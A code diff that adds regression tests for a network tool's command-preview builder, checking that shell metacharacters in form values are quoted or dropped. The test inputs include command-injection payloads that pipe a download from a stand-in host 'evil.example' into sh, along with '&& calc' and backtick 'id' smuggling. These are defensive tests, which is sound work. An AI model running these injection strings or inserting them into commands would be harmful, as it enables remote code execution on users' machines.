@@ -115,11 +115,37 @@ describe('buildCommand', () => {
     expect(buildCommand(scan)).toBe('netscli scan router.local --json');
   });
 
-  it('escapes quotes in a capture filter so the preview stays paste-able', () => {
+  // The command is copied from the strip, every value in it comes from the
+  // form, and a result bundle can fill the form with anything. A host of
+  // `1.1.1.1; curl ... | sh` used to be one click from the clipboard as a
+  // working command.
+  it('keeps a value with shell syntax in it to a single quoted argument', () => {
+    const scan = createTab('scan');
+    scan.form.host = '1.1.1.1; curl https://evil.example | sh';
+    expect(buildCommand(scan)).toBe('netscli scan "1.1.1.1; curl https://evil.example | sh" -p 22,80,443 --json');
+
+    const ping = createTab('ping');
+    ping.form.host = 'router.local';
+    ping.form.count = '4 && calc';
+    expect(buildCommand(ping)).toBe('netscli ping router.local --count "4 && calc" --json');
+  });
+
+  it('leaves out a value that no quoting makes safe', () => {
+    const scan = createTab('scan');
+    scan.form.host = '$(curl https://evil.example | sh)';
+    scan.form.ports = '80`id`';
+    expect(buildCommand(scan)).toBe('netscli scan <host> --json');
+
     const pcap = createTab('pcap');
     pcap.form.interface = 'eth0';
     pcap.form.filter = 'host "example"';
-    expect(buildCommand(pcap)).toContain('--filter "host \\"example\\""');
+    expect(buildCommand(pcap)).toBe('netscli pcap --interface eth0 --duration 10 --max-packets 1000 --json');
+  });
+
+  it('quotes a name with spaces so the preview stays paste-able', () => {
+    const pcap = createTab('pcap');
+    pcap.form.interface = 'vEthernet (WSL)';
+    expect(buildCommand(pcap)).toContain('--interface "vEthernet (WSL)"');
   });
 });
 
